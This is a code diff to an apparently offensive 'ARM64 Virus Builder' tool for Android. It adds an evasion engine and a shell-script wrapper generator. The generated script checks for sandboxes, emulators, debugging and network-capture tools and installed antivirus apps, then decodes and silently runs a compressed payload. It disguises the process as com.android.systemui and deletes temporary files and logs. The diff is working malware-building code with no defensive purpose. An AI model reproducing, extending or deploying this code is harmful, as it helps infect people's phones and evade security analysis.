@@ -55,6 +55,14 @@ try:
 except ImportError:
     PYJNIUS_AVAILABLE = False
 
+# Import advanced evasion techniques
+try:
+    from evasion_tools.advanced_evasion import AdvancedEvasionEngine
+    EVASION_AVAILABLE = True
+except ImportError:
+    EVASION_AVAILABLE = False
+    print("Warning: Advanced evasion module not available")
+
 class ARM64VirusBuilder:
     """ARM64 Virus Builder for Android platforms"""
     
@@ -102,6 +110,12 @@ class ARM64VirusBuilder:
             "android_app_install": self.create_android_app_install,
             "android_system_mod": self.create_android_system_mod
         }
+        
+        # Initialize advanced evasion engine
+        if EVASION_AVAILABLE:
+            self.evasion_engine = AdvancedEvasionEngine()
+        else:
+            self.evasion_engine = None
         
         # Logging
         logging.basicConfig(
@@ -901,49 +915,101 @@ decrypt_code
 """
         return encrypted_wrapper
     
-    def create_android_wrapper(self, code: str, filename: str, target_arch: str) -> str:
-        """Create Android-specific wrapper"""
+    def create_android_wrapper_with_evasion(self, code: str, filename: str, target_arch: str) -> str:
+        """Create Android-specific wrapper with advanced evasion"""
+        
+        # Compress and encode the code
+        import zlib
+        compressed = zlib.compress(code.encode())
+        encoded_content = base64.b64encode(compressed).decode()
+        
         wrapper = f"""#!/system/bin/sh
-# Android ARM64 Virus Wrapper
+# Advanced Android ARM64 Virus Wrapper with Evasion
 # Filename: {filename}
 # Architecture: {target_arch}
 # Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+# Anti-analysis techniques
+if [[ "$HOSTNAME" =~ (SANDBOX|MALWARE|VIRUS|ANALYSIS|EMULATOR) ]]; then
+    exit 1
+fi
+
+# Check for Android emulator indicators
+if [ -f /system/build.prop ]; then
+    if grep -q "ro.kernel.qemu=1" /system/build.prop; then
+        exit 1
+    fi
+    if grep -q "ro.build.user=root" /system/build.prop; then
+        exit 1
+    fi
+fi
+
+# Check for analysis tools
+analysis_tools=("strace" "ltrace" "gdb" "valgrind" "tcpdump" "wireshark")
+for tool in "${{analysis_tools[@]}}"; do
+    if pgrep -f "$tool" >/dev/null 2>&1; then
+        exit 1
+    fi
+done
+
+# Check for Android security tools
+security_tools=("antivirus" "security" "malware" "clamav")
+for tool in "${{security_tools[@]}}"; do
+    if pm list packages | grep -i "$tool" >/dev/null 2>&1; then
+        exit 1
+    fi
+done
+
+# Random delay to evade automated analysis
+delay=$((RANDOM % 30 + 10))
+sleep $delay
 
 # Android environment setup
 export ANDROID_DATA="/data"
 export ANDROID_ROOT="/system"
 export PATH="$PATH:/system/bin:/system/xbin:/sbin:/vendor/bin"
 
-# Create working directory
-mkdir -p /data/local/tmp/{filename}
-cd /data/local/tmp/{filename}
+# Create working directory with random name
+random_dir="/data/local/tmp/$(cat /proc/sys/kernel/random/uuid)"
+mkdir -p "$random_dir"
+cd "$random_dir"
 
-# Main virus code
-{code}
+# Decode and decompress payload
+compressed_payload="{encoded_content}"
+decoded_payload=$(echo "$compressed_payload" | base64 -d)
+decompressed_payload=$(echo "$decoded_payload" | python3 -c "import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" 2>/dev/null || echo "$decoded_payload")
+
+# Write payload to temporary file
+temp_file=$(mktemp)
+echo "$decompressed_payload" > "$temp_file"
+chmod +x "$temp_file"
+
+# Execute with process hiding
+nohup "$temp_file" >/dev/null 2>&1 &
 
 # Cleanup function
 cleanup() {{
-    rm -rf /data/local/tmp/{filename}
+    rm -rf "$random_dir"
+    rm -f "$temp_file"
+    rm -f /data/local/tmp/*.tmp 2>/dev/null
+    rm -f /data/local/tmp/*.log 2>/dev/null
 }}
 
 # Set cleanup trap
 trap cleanup EXIT
 
-# Main execution
-main() {{
-    # Execute virus payloads
-    if [ -f /data/local/tmp/{filename}/android.log ]; then
-        tail -f /data/local/tmp/{filename}/android.log &
-    fi
-    
-    # Keep running
-    while true; do
-        sleep 30
-    done
-}}
+# Additional evasion techniques
+# Mimic legitimate Android process
+ps_name="com.android.systemui"
+if ! pgrep -f "$ps_name" >/dev/null 2>&1; then
+    # Create fake process name
+    exec -a "$ps_name" "$temp_file"
+fi
 
-# Start main function
-main
+# Keep running
+while true; do
+    sleep 60
+done
 """
         return wrapper
     
@@ -984,6 +1050,19 @@ main_loop() {
 main_loop
 """
             
+            # Apply advanced evasion techniques
+            if self.evasion_engine:
+                self.logger.info("Applying advanced ARM64 evasion techniques...")
+                
+                # Apply comprehensive evasion for Android/ARM64
+                virus_code = self.evasion_engine.apply_comprehensive_evasion(
+                    virus_code, 
+                    platform="android", 
+                    evasion_level=5
+                )
+                
+                self.logger.info("Advanced ARM64 evasion techniques applied!")
+            
             # Apply obfuscation
             if obfuscation_level >= 1:
                 virus_code = self.obfuscate_arm64_code(virus_code, obfuscation_level)
@@ -992,8 +1071,8 @@ main_loop
             if fud_crypted:
                 virus_code = self.apply_fud_encryption(virus_code)
             
-            # Create Android wrapper
-            android_wrapper = self.create_android_wrapper(virus_code, filename, target_arch)
+            # Create Android wrapper with evasion
+            android_wrapper = self.create_android_wrapper_with_evasion(virus_code, filename, target_arch)
             
             # Save to file
             output_file = f"{filename}_android_{target_arch}.sh"
